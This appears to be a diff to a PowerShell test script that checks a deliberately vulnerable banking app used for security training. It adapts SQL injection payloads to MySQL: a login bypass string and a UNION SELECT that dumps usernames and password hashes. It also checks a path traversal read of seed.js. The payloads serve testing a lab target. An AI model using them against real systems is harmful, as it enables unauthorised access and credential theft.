@@ -84,7 +84,8 @@ Check 'GET /login returns 200' ((StatusOf $r) -eq 200)
 Write-Host ''
 Write-Host '--- 1 SQLi login bypass ---' -ForegroundColor Cyan
 $sqliSession = NewSession
-$sqliUser = "' OR '1'='1' --"
+# MySQL requires whitespace after `--`; use `#` (single-line) which works in both.
+$sqliUser = "' OR '1'='1'#"
 $r = Hit -Method POST -Path '/login' -Session $sqliSession -Form @{
     username = $sqliUser
     password = 'nope'
@@ -116,7 +117,8 @@ Check 'idor shows other account number' (($body -match '4002-6601-0001') -or ($b
 Write-Host ''
 Write-Host '--- 4 SQLi accounts/search ---' -ForegroundColor Cyan
 Add-Type -AssemblyName System.Web
-$q = "x' UNION SELECT username,password_md5,role FROM users--"
+# MySQL: `--` needs trailing whitespace; use `#` which collapses cleanly when URL-encoded.
+$q = "x' UNION SELECT username,password_md5,role FROM users#"
 $enc = [System.Web.HttpUtility]::UrlEncode($q)
 $r = Hit -Method GET -Path ('/accounts/search?q=' + $enc) -Session $alice
 $body = ReadBody $r
@@ -317,7 +319,7 @@ Write-Host ''
 Write-Host '--- 20 path traversal statements/file ---' -ForegroundColor Cyan
 $r = Hit -Method GET -Path '/statements/file?name=../../seed.js' -Session $alice
 $body = ReadBody $r
-Check 'seed.js leaked via traversal' (((StatusOf $r) -eq 200) -and ($body -match 'Seeding vuln-bank'))
+Check 'seed.js leaked via traversal' (((StatusOf $r) -eq 200) -and ($body -match 'resetting vuln-bank schema'))
 
 Write-Host ''
 Write-Host '=================================================' -ForegroundColor Yellow
